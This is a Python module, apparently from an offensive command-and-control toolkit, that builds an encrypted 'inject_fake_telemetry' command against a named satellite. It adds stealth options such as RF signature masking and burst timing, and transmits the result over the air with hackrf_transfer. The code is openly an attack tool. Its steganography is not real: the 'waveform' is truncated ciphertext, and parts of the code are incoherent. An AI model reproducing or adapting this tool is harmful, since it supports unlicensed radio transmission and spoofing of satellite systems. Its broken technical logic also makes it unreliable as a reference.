#!/usr/bin/env python3
# File: modules/c2/rf_stego_dropper.py

import os
import time
import json
import base64
import random
import subprocess
from datetime import datetime
from pathlib import Path
from cryptography.hazmat.primitives.ciphers.aead import AESGCM
import secrets

# Directories and constants
PAYLOAD_DIR = "rf_payloads"
LOG_FILE = "logs/rf_stego_dropper.log"
ALERT_FILE = "webgui/alerts.json"
STEGO_OUTPUT = f"{PAYLOAD_DIR}/covert_rf_payload.wav"
KEY = AESGCM.generate_key(bit_length=256)
AESGCM_KEY_ID = "session2025"
os.makedirs(PAYLOAD_DIR, exist_ok=True)
Path(LOG_FILE).parent.mkdir(parents=True, exist_ok=True)

def log(msg):
    with open(LOG_FILE, "a") as f:
        f.write(f"[{datetime.utcnow()}] {msg}\n")
    print(msg)

def generate_payload():
    """Creates a covert command payload for satellite tampering."""
    raw_data = "TEMP=88.6;POS=42.364N,8.737W;BAT=12.2V"
    encrypted_data, nonce = encrypt_payload(raw_data.encode())
    payload = {
        "timestamp": datetime.utcnow().isoformat(),
        "payload_type": "telemetry_overwrite_command",
        "target": {
            "satellite_id": "SAT-321B",
            "frequency_hz": 137500000,
            "modulation": "FSK"
        },
        "command": {
            "operation": "inject_fake_telemetry",
            "data": base64.b64encode(encrypted_data).decode(),
            "nonce": base64.b64encode(nonce).decode(),
            "encryption": "aes-256-gcm",
            "key_hint": AESGCM_KEY_ID
        },
        "stealth": {
            "timing_randomization": True,
            "burst_mode": True,
            "rf_signature_masking": True,
            "fallback_channels": [137.1e6, 137.7e6]
        },
        "authenticity_tag": secrets.token_hex(8)
    }
    output_file = os.path.join(PAYLOAD_DIR, f"covert_rf_payload_{int(time.time())}.json")
    with open(output_file, "w") as f:
        json.dump(payload, f, indent=2)
    return payload, output_file

def encrypt_payload(data: bytes):
    nonce = os.urandom(12)
    aesgcm = AESGCM(KEY)
    ct = aesgcm.encrypt(nonce, data, associated_data=None)
    return ct, nonce

def generate_stego_wave(payload_data: dict):
    """Generates a WAV file with embedded base64 payload using a Swift-generated waveform."""
    wave_content = base64.b64decode(payload_data["command"]["data"])
    with open(STEGO_OUTPUT, "wb") as f:
        f.write(wave_content[:2048])  # Simulate waveform block
    log(f"[+] Stego waveform saved to {STEGO_OUTPUT}")

def alert(payload_data):
    alert = {
        "timestamp": payload_data["timestamp"],
        "type": "rf_stego_payload_ready",
        "satellite_id": payload_data["target"]["satellite_id"],
        "confidence": "high"
    }
    try:
        if os.path.exists(ALERT_FILE):
            with open(ALERT_FILE, "r") as f:
                alerts = json.load(f)
        else:
            alerts = []
        alerts.append(alert)
        with open(ALERT_FILE, "w") as f:
            json.dump(alerts, f, indent=2)
    except Exception as e:
        log(f"[!] Failed to write alert: {e}")

def optionally_transmit(payload_data):
    """Simulated optional transmission using hackrf_transfer or rtl_fm (offline staging)."""
    freq = payload_data["target"]["frequency_hz"]
    if shutil.which("hackrf_transfer"):
        cmd = [
            "hackrf_transfer",
            "-t", STEGO_OUTPUT,
            "-f", str(int(freq)),
            "-x", "20",
            "-s", "2000000"
        ]
        log("[*] Transmitting via HackRF...")
        subprocess.run(cmd)
        log("[+] Transmission complete.")
    else:
        log("[!] HackRF not found. Transmission skipped.")

def main():
    log("[*] RF Stego Dropper Module started")
    payload, path = generate_payload()
    log(f"[+] Payload saved to: {path}")
    generate_stego_wave(payload)
    alert(payload)
    optionally_transmit(payload)
    log("[*] Module complete")

if __name__ == "__main__":
    import shutil
    main()
